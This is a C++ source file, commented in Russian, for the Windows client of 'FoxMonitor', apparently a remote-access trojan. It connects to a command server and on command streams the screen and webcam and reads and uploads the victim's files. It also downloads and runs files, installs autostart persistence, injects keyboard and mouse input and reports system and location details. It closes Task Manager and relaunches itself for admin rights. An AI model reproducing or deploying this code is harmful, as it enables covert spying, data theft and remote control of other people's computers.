// FoxMonitor client.
// Потоки: сеть (handshake, команды, пульт), захват экрана, захват камеры.
// Бинарный протокол кадра (по WebSocket, kind=0x02):
//   [kind=1|2|3][len BE32][JPEG]
//     1 = экран, 2 = камера, 3 = скриншот по команде (payload = [stream][JPEG])

// Должны идти до любых Windows-заголовков: winsock2.h тянет windows.h сам,
// иначе макросы min/max сломают std::min/std::max.
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <algorithm>
#include <atomic>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "config.h"
#include "wsclient.h"
#include "jpeg.h"
#include "screen.h"
#include "camera.h"
#include "sysinfo.h"
#include "filemgr.h"
#include "misc.h"

#include <windows.h>
#include <shellapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// Поднятие прав: большинство функций вкладки «Прочее» (PnP-устройства,
// HKLM-политики) требуют администратора. Если запущены без прав — просим UAC.
static bool isElevated() {
    HANDLE h = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return false;
    TOKEN_ELEVATION te{};
    DWORD sz = 0;
    bool ok = GetTokenInformation(h, TokenElevation, &te, sizeof(te), &sz);
    CloseHandle(h);
    return ok && te.TokenIsElevated;
}

using namespace std::chrono;

// -------------------------------------------------------------- global --
static Config g_cfg;
static std::mutex g_sendMtx;
static WsClient* g_ws = nullptr; // защищён g_sendMtx; потоки join'ятся до уничтожения

static std::atomic<bool> g_screenRun{false};
static std::atomic<bool> g_cameraRun{false};
static std::atomic<bool> g_cameraReady{false};
static std::atomic<int>  g_quality{75};
static std::atomic<int>  g_screenFps{10};
static std::atomic<int>  g_cameraFps{5};
static std::mutex        g_camMtx;      // камера не потокобезопасна
static Camera            g_cam;

// ---------------------------------------------------- минимальный JSON --
static std::string jsonStr(const std::string& s, const char* key) {
    std::string k = std::string("\"") + key + "\"";
    size_t p = s.find(k);
    if (p == std::string::npos) return "";
    p += k.size();
    while (p < s.size() && (s[p] == ' ' || s[p] == ':')) p++;
    if (p < s.size() && s[p] == '"') {
        p++;
        std::string out;
        while (p < s.size() && s[p] != '"') {
            if (s[p] == '\\' && p + 1 < s.size()) p++;
            out += s[p++];
        }
        return out;
    }
    return "";
}

static long long jsonInt(const std::string& s, const char* key, long long def) {
    std::string k = std::string("\"") + key + "\"";
    size_t p = s.find(k);
    if (p == std::string::npos) return def;
    p += k.size();
    while (p < s.size() && (s[p] == ' ' || s[p] == ':')) p++;
    size_t st = p;
    while (p < s.size() && isdigit((unsigned char)s[p])) p++;
    if (p == st) return def;
    return atoll(s.substr(st, p - st).c_str());
}

static bool jsonBool(const std::string& s, const char* key, bool def) {
    std::string k = std::string("\"") + key + "\"";
    size_t p = s.find(k);
    if (p == std::string::npos) return def;
    p += k.size();
    while (p < s.size() && (s[p] == ' ' || s[p] == ':')) p++;
    if (p < s.size() && (s[p] == 't' || s[p] == 'T')) return true;
    if (p < s.size() && s[p] == '1') return true;
    return false;
}

static std::string urlEncode(const std::string& s) {
    std::string out;
    static const char* hex = "0123456789ABCDEF";
    for (unsigned char c : s) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.') out += (char)c;
        else { out += '%'; out += hex[c >> 4]; out += hex[c & 15]; }
    }
    return out;
}

static std::atomic<bool> g_wsDead{false}; // соединение неработоспособно: потоки должны выйти
static std::atomic<bool> g_exiting{false}; // завершаем потоки на отключении
static std::atomic<int>  g_nActive{0};     // активные потоки захвата
static std::mutex        g_exitMtx;
static std::condition_variable g_exitCv;

struct ThreadGuard {
    ThreadGuard() { { std::lock_guard<std::mutex> lk(g_exitMtx); ++g_nActive; } }
    ~ThreadGuard() {
        { std::lock_guard<std::mutex> lk(g_exitMtx); --g_nActive; }
        g_exitCv.notify_all();
    }
};

// --------------------------------------------------------- отправка ------
static void wsSendText(const std::string& text) {
    std::lock_guard<std::mutex> lk(g_sendMtx);
    if (!g_ws) return;
    if (!g_ws->sendText(text)) g_wsDead = true;
}

// kind: 1=экран, 2=камера, 3=скриншот; для скриншота streamByte=1|2 в начале payload
static void wsSendFrame(uint8_t kind, const std::vector<uint8_t>& jpg, uint8_t streamByte = 0) {
    std::lock_guard<std::mutex> lk(g_sendMtx);
    if (!g_ws) return;
    bool ok;
    if (kind == 3) {
        std::vector<uint8_t> pkt;
        pkt.push_back(streamByte);
        pkt.insert(pkt.end(), jpg.begin(), jpg.end());
        ok = g_ws->sendBinary(3, pkt.data(), pkt.size());
    } else {
        ok = g_ws->sendBinary(kind, jpg.data(), jpg.size());
    }
    if (!ok) g_wsDead = true;
}

static void sendStatus() {
    char buf[256];
    snprintf(buf, sizeof(buf),
             "{\"type\":\"status\",\"streams\":{\"screen\":%s,\"camera\":%s},\"fps\":{\"screen\":%d,\"camera\":%d}}",
             g_screenRun.load() ? "true" : "false",
             (g_cameraRun.load() && g_cameraReady.load()) ? "true" : "false",
             g_screenFps.load(), g_cameraFps.load());
    wsSendText(buf);
}

// Ответ файлового менеджера: {"type":"fm","req_id":N,"action":...,"ok":bool,"error":?}
static void sendFmResult(long long rid, const char* action, bool ok, const std::string& err = "") {
    std::string reply = "{\"type\":\"fm\",\"req_id\":" + std::to_string(rid) +
                        ",\"action\":\"" + action + "\",\"ok\":" + (ok ? "true" : "false");
    if (!ok) reply += ",\"error\":\"" + err + "\"";
    reply += "}";
    wsSendText(reply);
}

// ------------------------------------------------------- команды --------
// Инициализация камеры под мьютексом; попытка не чаще раза в 3 сек.
static bool ensureCamera() {
    static bool inited = false;
    static steady_clock::time_point lastTry{};
    if (inited) return true;
    if (steady_clock::now() - lastTry < seconds(3)) return false;
    lastTry = steady_clock::now();
    std::lock_guard<std::mutex> lk(g_camMtx);
    if (g_cam.init(0)) {
        inited = true;
        g_cameraReady = true;
        printf("[camera] device ready\n");
        sendStatus();
        return true;
    }
    g_cameraReady = false;
    printf("[camera] init failed\n");
    return false;
}

static void handleCommand(const std::string& msg) {
    std::string cmd = jsonStr(msg, "command");
    std::string stream = jsonStr(msg, "stream");
    long long value = jsonInt(msg, "value", -1);

    if (cmd == "stop") {
        if (stream == "screen") g_screenRun = false;
        else if (stream == "camera") g_cameraRun = false;
        else { g_screenRun = false; g_cameraRun = false; }
    } else if (cmd == "start") {
        if (stream == "screen") g_screenRun = true;
        else if (stream == "camera") g_cameraRun = true;
        else { g_screenRun = true; g_cameraRun = true; }
    } else if (cmd == "quality") {
        if (value >= 5 && value <= 100) g_quality = (int)value;
    } else if (cmd == "setfps") {
        if (value >= 1 && value <= 60) {
            if (stream == "camera") g_cameraFps = (int)value;
            else g_screenFps = (int)value;
        }
    } else if (cmd == "screenshot") {
        std::vector<uint8_t> jpg;
        if (stream == "camera") {
            if (ensureCamera()) {
                std::lock_guard<std::mutex> lk(g_camMtx);
                std::vector<uint8_t> rgb;
                int w = 0, h = 0;
                uint64_t ts = 0;
                if (g_cam.captureFrame(rgb, w, h, ts) &&
                    jpegEncodeRGB24(rgb.data(), w, h, ((w * 3 + 3) / 4) * 4, g_quality.load(), jpg))
                    wsSendFrame(3, jpg, 2);
            }
        } else {
            ScreenCap cap;
            if (screenCapture(cap) &&
                jpegEncodeRGB24(cap.rgb.data(), cap.width, cap.height, cap.stride,
                                g_quality.load(), jpg))
                wsSendFrame(3, jpg, 1);
        }
    }

    // ------------------------------------------------- файловый менеджер --
    else if (cmd == "flist") {
        long long rid = jsonInt(msg, "req_id", 0);
        std::string entries, err;
        if (fmListPath(jsonStr(msg, "path"), entries, err)) {
            std::string reply = "{\"type\":\"fm\",\"req_id\":";
            reply += std::to_string(rid);
            reply += ",\"action\":\"list\",\"ok\":true,\"entries\":";
            reply += entries;
            reply += "}";
            wsSendText(reply);
        } else {
            char b[512];
            snprintf(b, sizeof(b),
                     "{\"type\":\"fm\",\"req_id\":%lld,\"action\":\"list\",\"ok\":false,\"error\":\"%s\"}",
                     rid, err.c_str());
            wsSendText(b);
        }
    } else if (cmd == "fread") {
        long long rid = jsonInt(msg, "req_id", 0);
        std::string path = jsonStr(msg, "path");
        long long cap = jsonInt(msg, "size", 8 * 1024 * 1024);
        std::vector<uint8_t> data;
        std::string err;
        if (cap <= 0) cap = 8 * 1024 * 1024;
        if (fmReadFile(path, (size_t)cap, data, err)) {
            std::vector<uint8_t> pkt(8 + data.size());
            uint32_t r = (uint32_t)rid, sz = (uint32_t)data.size();
            pkt[0] = (uint8_t)(r >> 24); pkt[1] = (uint8_t)(r >> 16);
            pkt[2] = (uint8_t)(r >> 8);  pkt[3] = (uint8_t)(r & 0xFF);
            pkt[4] = (uint8_t)(sz >> 24); pkt[5] = (uint8_t)(sz >> 16);
            pkt[6] = (uint8_t)(sz >> 8);  pkt[7] = (uint8_t)(sz & 0xFF);
            memcpy(pkt.data() + 8, data.data(), data.size());
            std::lock_guard<std::mutex> lk(g_sendMtx);
            if (g_ws) g_ws->sendBinary(4, pkt.data(), pkt.size());
        } else {
            char b[512];
            snprintf(b, sizeof(b),
                     "{\"type\":\"fm\",\"req_id\":%lld,\"action\":\"read\",\"ok\":false,\"error\":\"%s\"}",
                     rid, err.c_str());
            wsSendText(b);
        }
    } else if (cmd == "frun") {
        std::string err;
        bool ok = fmRunFile(jsonStr(msg, "path"), err);
        sendFmResult(jsonInt(msg, "req_id", 0), "run", ok, err);
    } else if (cmd == "fautostart") {
        std::string err;
        bool ok = fmInstallAutostart(jsonStr(msg, "path"), err);
        sendFmResult(jsonInt(msg, "req_id", 0), "autostart", ok, err);
    } else if (cmd == "misc") {
        // Вкладка «Прочее»: системный тумблер -> [func][on]
        std::string func = jsonStr(msg, "func");
        bool on = jsonBool(msg, "on", false);
        long long rid = jsonInt(msg, "req_id", 0);
        std::string err;
        bool ok = !func.empty() && miscApply(func, on, err);
        if (!func.empty() && !ok && err.empty()) err = "misc failed";
        std::string reply = "{\"type\":\"fm\",\"req_id\":" + std::to_string(rid) +
                            ",\"action\":\"misc\",\"ok\":" + (ok ? "true" : "false") +
                            ",\"func\":\"" + func + "\",\"on\":" + (on ? "true" : "false");
        if (!err.empty()) reply += ",\"error\":\"" + err + "\"";
        reply += "}";
        wsSendText(reply);
    } else if (cmd == "killtaskmgr") {
        // Закрыть диспетчер задач (действие без состояния)
        long long rid = jsonInt(msg, "req_id", 0);
        std::string err;
        bool ok = miscKillTaskmgr(err);
        std::string reply = "{\"type\":\"fm\",\"req_id\":" + std::to_string(rid) +
                            ",\"action\":\"killtaskmgr\",\"ok\":" + (ok ? "true" : "false");
        if (!err.empty()) reply += ",\"error\":\"" + err + "\"";
        reply += "}";
        wsSendText(reply);

        fflush(stdout);
    } else if (cmd == "miscstatus") {
        // Текущее состояние тумблеров для UI при открытии вкладки «Прочее».
        long long rid = jsonInt(msg, "req_id", 0);
        std::string reply = "{\"type\":\"fm\",\"req_id\":" + std::to_string(rid) +
                            ",\"action\":\"miscstatus\",\"ok\":true,\"states\":" +
                            miscStateJson() + "}";
        wsSendText(reply);
    } else if (cmd == "fdel") {
        std::string err;
        bool ok = fmDeletePath(jsonStr(msg, "path"), err);
        sendFmResult(jsonInt(msg, "req_id", 0), "delete", ok, err);
    }
    sendStatus();
}

// -------------------------------------------- удалённое управление --------
// Кадры экрана покрывают весь виртуальный стол, поэтому координаты
// из UI (пиксели захваченного кадра) маппятся в абсолютные координаты
// виртуального стола прибавлением SM_XVIRTUALSCREEN/SM_YVIRTUALSCREEN.

static void sendScanKey(WORD vk, bool down) {
    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC_EX);
    INPUT in{};
    in.type = INPUT_KEYBOARD;
    in.ki.wScan = (WORD)scan;
    in.ki.dwFlags = KEYEVENTF_SCANCODE | (down ? 0 : KEYEVENTF_KEYUP);
    SendInput(1, &in, sizeof(INPUT));
}

static void sendUnicodeChar(wchar_t c, bool down) {
    INPUT in{};
    in.type = INPUT_KEYBOARD;
    in.ki.wScan = c;
    in.ki.dwFlags = KEYEVENTF_UNICODE | (down ? 0 : KEYEVENTF_KEYUP);
    SendInput(1, &in, sizeof(INPUT));
}

struct KeyName { const char* name; WORD vk; };

static const KeyName kSpecialKeys[] = {
    {"Enter", VK_RETURN}, {"Escape", VK_ESCAPE}, {"Tab", VK_TAB},
    {"Backspace", VK_BACK}, {"Space", VK_SPACE}, {"Delete", VK_DELETE},
    {"Insert", VK_INSERT}, {"Home", VK_HOME}, {"End", VK_END},
    {"PageUp", VK_PRIOR}, {"PageDown", VK_NEXT},
    {"ArrowUp", VK_UP}, {"ArrowDown", VK_DOWN},
    {"ArrowLeft", VK_LEFT}, {"ArrowRight", VK_RIGHT},
    {"CapsLock", VK_CAPITAL}, {"Shift", VK_SHIFT},
    {"Control", VK_CONTROL}, {"Alt", VK_MENU},
    {"Meta", VK_LWIN}, {"ContextMenu", VK_APPS},
    {"NumLock", VK_NUMLOCK}, {"ScrollLock", VK_SCROLL},
    {"Pause", VK_PAUSE}, {"PrintScreen", VK_SNAPSHOT},
};

static void handleInput(const std::string& msg) {
    std::string kind = jsonStr(msg, "kind");

    if (kind == "mousemove") {
        long long x = jsonInt(msg, "x", 0);
        long long y = jsonInt(msg, "y", 0);
        SetCursorPos((int)(x + GetSystemMetrics(SM_XVIRTUALSCREEN)),
                     (int)(y + GetSystemMetrics(SM_YVIRTUALSCREEN)));
    } else if (kind == "mousedown" || kind == "mouseup") {
        std::string button = jsonStr(msg, "button");
        DWORD downFlags, upFlags;
        if (button == "right")   { downFlags = MOUSEEVENTF_RIGHTDOWN;  upFlags = MOUSEEVENTF_RIGHTUP; }
        else if (button == "middle") { downFlags = MOUSEEVENTF_MIDDLEDOWN; upFlags = MOUSEEVENTF_MIDDLEUP; }
        else                     { downFlags = MOUSEEVENTF_LEFTDOWN;   upFlags = MOUSEEVENTF_LEFTUP; }

        long long x = jsonInt(msg, "x", -1);
        long long y = jsonInt(msg, "y", -1);
        if (x >= 0 && y >= 0)
            SetCursorPos((int)(x + GetSystemMetrics(SM_XVIRTUALSCREEN)),
                         (int)(y + GetSystemMetrics(SM_YVIRTUALSCREEN)));
        mouse_event(kind == "mousedown" ? downFlags : upFlags, 0, 0, 0, 0);
    } else if (kind == "wheel") {
        long long delta = jsonInt(msg, "delta", 0);
        if (delta) mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (DWORD)delta, 0);
    } else if (kind == "key") {
        std::string key = jsonStr(msg, "key");
        bool down = jsonInt(msg, "down", 1) != 0;
        if (key.empty()) return;

        // спецклавиши — по имени из e.key браузера
        for (const auto& k : kSpecialKeys) {
            if (strcmp(k.name, key.c_str()) == 0) {
                sendScanKey(k.vk, down);
                return;
            }
        }
        // F1..F24
        if (key.size() >= 2 && key[0] == 'F' && isdigit((unsigned char)key[1])) {
            int n = atoi(key.c_str() + 1);
            if (n >= 1 && n <= 24) { sendScanKey((WORD)(VK_F1 + n - 1), down); return; }
        }
        // однобуквенные и многобайтовые (UTF-8) — через UNICODE-флаг
        if (key.size() == 1 && isprint((unsigned char)key[0])) {
            sendUnicodeChar((wchar_t)(unsigned char)key[0], down);
        } else if (key.size() > 1) {
            wchar_t wbuf[16];
            int n = MultiByteToWideChar(CP_UTF8, 0, key.c_str(), (int)key.size(), wbuf, 16);
            for (int i = 0; i < n; i++) sendUnicodeChar(wbuf[i], down);
        }
    }
}

static void handleMessage(const std::string& msg) {
    if (jsonStr(msg, "type") == "input") handleInput(msg);
    else handleCommand(msg);
}

// Бинарные сообщения от сервера: kind=5 — загрузка файла файловым менеджером.
// Payload: [req_id BE32][run u8][path_len BE32][path UTF-8][данные файла]
static void handleBinary(int kind, const uint8_t* data, size_t size) {
    auto be32 = [&](size_t off) {
        return ((uint32_t)data[off] << 24) | ((uint32_t)data[off + 1] << 16) |
               ((uint32_t)data[off + 2] << 8) | data[off + 3];
    };
    if (kind == 5) printf("[fm] upload msg: size=%zu plen=%u run=%u\n",
                          size, (size >= 9) ? be32(5) : 0u, (size >= 5) ? data[4] : 0u);
    fflush(stdout);
    if (kind != 5 || size < 9) return;
    uint32_t rid = be32(0);
    bool run = data[4] != 0;
    uint32_t plen = be32(5);
    if (9 + plen > size) return;

    std::string path((const char*)data + 9, plen);
    std::string err;
    bool ok = fmWriteFile(path, data + 9 + plen, size - 9 - plen, err);
    if (ok && run) {
        std::string rerr;
        if (!fmRunFile(path, rerr)) printf("[fm] run after upload failed: %s\n", rerr.c_str());
    }
    sendFmResult(rid, "write", ok, err);
}

// ------------------------------------------------------- захваты --------
static void screenLoop() {
    ThreadGuard tg;
    ScreenCap cap;
    while (true) {
        if (g_wsDead.load() || g_exiting.load()) return;
        if (!g_screenRun.load()) { Sleep(200); continue; }
        auto t0 = steady_clock::now();

        if (screenCapture(cap)) {
            std::vector<uint8_t> jpg;
            if (jpegEncodeRGB24(cap.rgb.data(), cap.width, cap.height, cap.stride,
                                g_quality.load(), jpg))
                wsSendFrame(1, jpg);
        }

        int interval = 1000 / std::max(1, g_screenFps.load());
        auto dt = duration_cast<milliseconds>(steady_clock::now() - t0).count();
        if (interval - dt > 0) Sleep((DWORD)(interval - dt));
    }
}

static void cameraLoop() {
    ThreadGuard tg;
    std::vector<uint8_t> rgb;
    int w = 0, h = 0;
    uint64_t ts = 0;

    while (true) {
        if (g_wsDead.load() || g_exiting.load()) return;
        if (!g_cameraRun.load()) { Sleep(200); continue; }
        auto t0 = steady_clock::now();

        if (ensureCamera()) {
            std::lock_guard<std::mutex> lk(g_camMtx);
            if (g_cam.captureFrame(rgb, w, h, ts)) {
                std::vector<uint8_t> jpg;
                if (jpegEncodeRGB24(rgb.data(), w, h, ((w * 3 + 3) / 4) * 4,
                                    g_quality.load(), jpg))
                    wsSendFrame(2, jpg);
            }
        }

        int interval = 1000 / std::max(1, g_cameraFps.load());
        auto dt = duration_cast<milliseconds>(steady_clock::now() - t0).count();
        if (interval - dt > 0) Sleep((DWORD)(interval - dt));
    }
}

// ------------------------------------------------------------ main ------
int main() {
    srand((unsigned)time(nullptr));
    SetConsoleOutputCP(65001);

    // Функции «Прочее» требуют прав администратора — перезапускаемся через UAC.
    if (!isElevated()) {
        wchar_t exe[MAX_PATH];
        if (GetModuleFileNameW(nullptr, exe, MAX_PATH)) {
            printf("[net] not elevated, requesting UAC...\n"); fflush(stdout);
            ShellExecuteW(nullptr, L"runas", exe, L"", nullptr, SW_SHOWNORMAL);
        }
        return 0;
    }

    loadConfig(g_cfg, "config.ini");
    if (g_cfg.tls && g_cfg.port == 8080) g_cfg.port = 443; // wss по умолчанию 443

    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { printf("[net] WSAStartup failed\n"); return 1; }
    if (!jpegInit()) { printf("[jpeg] GDI+ init failed\n"); return 1; }

    g_quality = g_cfg.jpeg_quality;
    g_screenFps = g_cfg.screen_fps;
    g_cameraFps = g_cfg.camera_fps;

    printf("[foxmon] %s -> %s:%d%s (screen %d fps, camera %d fps, q=%d)\n",
           g_cfg.client_id.c_str(), g_cfg.host.c_str(), g_cfg.port,
           g_cfg.tls ? " (wss)" : "",
           g_screenFps.load(), g_cameraFps.load(), g_quality.load());

    std::string path = "/ws/client?name=" + urlEncode(g_cfg.client_id) +
                       "&key=" + urlEncode(g_cfg.client_key);

    while (true) {
        WsClient ws;
        ws.setTextHandler(handleMessage);
        ws.setBinaryHandler(handleBinary);

        if (!ws.connect(g_cfg.host, (uint16_t)g_cfg.port, path, g_cfg.tls)) {
            printf("[net] connect failed, retry in 3s\n"); fflush(stdout);
            Sleep(3000);
            continue;
        }
        printf("[net] connected\n"); fflush(stdout);
        g_wsDead = false;

        {
            std::lock_guard<std::mutex> lk(g_sendMtx);
            g_ws = &ws;
        }
        std::string hello = "{\"type\":\"hello\",\"id\":\"" + g_cfg.client_id +
                            "\",\"key\":\"" + g_cfg.client_key + "\"}";
        wsSendText(hello);

        g_screenRun = g_cfg.capture_screen;
        g_cameraRun = false; // камера включается только по команде сервера (вкладка «Камера»)
        sendStatus();
        wsSendText(collectSystemInfo(g_cfg)); // инфо о ПК/мониторах/местоположении

        std::thread tScreen(screenLoop);
        std::thread tCamera(cameraLoop);

        int pumps = 0;
        auto aliveAt = steady_clock::now();
        while (ws.pump()) {
            if (g_wsDead.load()) break; // send уже потерпел неудачу: не ждём сервер
            if (duration_cast<seconds>(steady_clock::now() - aliveAt).count() >= 30) {
                aliveAt = steady_clock::now();
                printf("[net] alive (pumps=%d)\n", pumps);
                fflush(stdout);
            }
        }
        if (g_wsDead.load()) printf("[net] dead by send, closing\n");

        printf("[net] disconnected\n"); fflush(stdout);
        g_screenRun = false;
        g_cameraRun = false;
        g_exiting = true; // потоки выходят и помечают себя через ThreadGuard
        {
            std::unique_lock<std::mutex> lk(g_exitMtx);
            auto deadline = steady_clock::now() + std::chrono::seconds(8);
            while (g_nActive > 0 && steady_clock::now() < deadline)
                g_exitCv.wait_for(lk, std::chrono::milliseconds(100));
        }
        if (g_nActive > 0) {
            // камера может висеть в Media Foundation без таймаута — не даём ей
            // блокировать переподключение, отвязываем поток
            printf("[net] threads stuck, detach\n"); fflush(stdout);
            tScreen.detach();
            tCamera.detach();
        } else {
            tScreen.join();
            tCamera.join();
        }
        g_exiting = false;
        {
            std::lock_guard<std::mutex> lk(g_sendMtx);
            g_ws = nullptr;
        }
        ws.close();
        Sleep(3000);
    }
}
